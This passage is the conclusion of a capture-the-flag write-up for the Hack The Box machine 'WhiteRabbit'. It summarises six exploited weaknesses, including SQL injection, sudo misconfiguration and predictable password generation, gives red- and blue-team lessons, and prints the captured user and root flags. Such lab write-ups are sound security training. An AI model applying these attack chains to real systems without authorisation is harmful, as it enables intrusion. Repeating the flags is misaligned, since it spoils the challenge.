### Vulnerabilities Exploited

#### 1. **Information Disclosure**

* **Where:** WikiJS without authentication
* **Impact:** Revealed HMAC secret and workflow details
* **Lesson:** Always implement authentication on documentation systems

#### 2. **SQL Injection**

* **Where:** n8n webhook email parameter
* **Impact:** Database dump revealing credentials
* **Lesson:** Always sanitize user input, use parameterized queries

#### 3. **Weak Archive Password**

* **Where:** bob.7z archive
* **Impact:** SSH key disclosure
* **Lesson:** Use strong passwords, avoid common patterns

#### 4. **Sudo Misconfiguration**

* **Where:** Bob can run restic as root without password
* **Impact:** Arbitrary file read as root
* **Lesson:** Restrict sudo access, avoid dangerous binaries

#### 5. **Predictable Password Generation**

* **Where:** neo-password-generator using timestamp
* **Impact:** Password brute force possible
* **Lesson:** Use cryptographically secure random number generators

#### 6. **Excessive Sudo Rights**

* **Where:** Neo has full sudo (ALL : ALL)
* **Impact:** Direct privilege escalation to root
* **Lesson:** Grant minimal necessary privileges

***

### What We Learned ?

#### For Red Teamers:

1. **Always enumerate thoroughly** - Virtual hosts, directories, subdomains
2. **Check documentation systems** - Often contain sensitive information
3. **Abuse backup systems** - Restic, rsync, tar backups can contain keys
4. **Reverse engineer custom binaries** - May reveal password generation logic
5. **Chain vulnerabilities** - One finding leads to another

#### For Blue Teamers:

1. **Implement authentication everywhere** - Even on internal documentation
2. **Use parameterized queries** - Prevent SQL injection
3. **Audit sudo configurations** - Regular reviews of /etc/sudoers
4. **Strong password policies** - Avoid predictable patterns
5. **Secure backup systems** - Encrypt backups, restrict access
6. **Monitor unusual commands** - Detect privilege escalation attempts

***

### Pwned!

```
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ cat flags.txt
[+] User Flag: bb25c7ef55e17820a626c5b4a5530e68
[+] Root Flag: b7c7eb99f8df35c94b9d6b0f43ad34d4

WhiteRabbit - PWNED 
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
